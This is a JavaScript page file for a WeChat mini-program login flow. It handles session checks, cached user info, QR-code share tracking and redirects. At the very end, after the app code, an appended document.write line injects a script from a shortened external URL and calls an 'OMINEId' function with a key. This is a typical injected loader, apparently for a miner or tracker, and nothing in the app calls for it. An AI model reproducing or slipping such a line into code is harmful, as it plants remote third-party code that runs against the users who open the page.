
var num=1,thispage;
var myApp = getApp();
var istrue=true,guid="",acguid="";
var h=wx.getSystemInfoSync().windowHeight-70; //获得滚动view的高度
Page({
    data: {
      style:'display:none',
      acguid:"",
      isTest:true,
      getInfo:false,
      scene:"",
      product:{src:"",key:"",keyname:""},
    },
    onLoad:function(option){
      var scene = "";
      var _this = this;
      if (option){
        if (option.scene){
          myApp.globalData.scene = option.scene;
          scene = decodeURIComponent(option.scene);
          this.setData({
            scene: scene
          });
        };
        if (option.reSet && myApp.removeCache("userInfo")){
          _this.onGotUserInfo( option.reSet);
         return;
        };
      };
      wx.checkSession({ //检测当前用户的session_key是否过期
        success: function () { //session_key 未过期，并且在本生命周期一直有效
          _this.onGotUserInfo();
          return;
        },
       
      })
     // console.log(option, scene);
      var userinfo = myApp.getCache("userInfo");
      //console.log(myApp, userinfo);
      if (userinfo || userinfo.session_token) {
        myApp.globalData.nickName = userinfo.nickName;
        myApp.globalData.headurl = userinfo.headurl;
        myApp.globalData.session_token = userinfo.session_token;     
         wx.switchTab({
           url: '/pages/index/index',
           success:function(){
             _this.sceneRedict();
           }
         })
      } else {
        _this.setData({
          getInfo: true
        },function(){
          _this.sceneRedict();
        });
        //_this.onGotUserInfo();
      }
    },
    onReady:function(){
      
    },
  sendrecomendInfo: function (scene,scene02){
      var _this = this;
     // var scene = decodeURIComponent(e.scene)
      if (scene) {//扫小程序二维码进来的
        wx.request({//记录用户分享的信息
          url: myApp.globalData.daxin + "/Customer/userQRcodeShareSave",
          method: "POST",
          data: {
            session_token: myApp.globalData.session_token,
            scene: scene,
           // scene: scene02||"00"
          },
        });
      }else{
        wx.showToast({
          title: '没有分享数据',
          duration:800
        })
      }
    },
  getSet: function () {
      var _this=this;
      wx.getSetting({
        success: function (res) {
          //console.log(res, res.authSetting.scope);
          if (res.authSetting.scope) {          
            _this.onGotUserInfo();
          } else {
            _this.setData({
              getInfo: true
            });
          }
        }
      })
    },
  sceneRedict:function(){
      var shareData = "";
      var _this =this;
    if (_this.data.scene) {
        _this.sendrecomendInfo(_this.data.scene);
        // shareData = myApp.getShareData(_this.data.scene);
        // //console.log("shareData", shareData, _this.data.scene);
        // if (shareData) {
        //   setTimeout(function(){
        //     wx.navigateTo({
        //        url: "/pages/goods/detail/index?id=13"
        //       //url: shareData.shareUrl
        //     })
        //   },500);
        // };
        return true;
      }else{
        return false;
      }
    },
  onGotUserInfo: function (reSet){
    var _this=this;    
      //使用微信登录 
     myApp.getUserInfo(function (e) {
        e = e || "";
        //页面重定向
        wx.redirectTo({
          url: "/pages/message/auth/index?text=" + e
        })
      },function(data){
        // var isscene = _this.sceneRedict();
        // if (isscene)return;
            wx.switchTab({
              url: '/pages/index/index',
              success:function(){
                _this.sceneRedict();
              }
            });
       }, reSet) 
    },
    onPullDownRefresh:function(){wx.showToast({title: '加载中', icon: 'loading',mask:true, duration: 10000});}
});


 
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
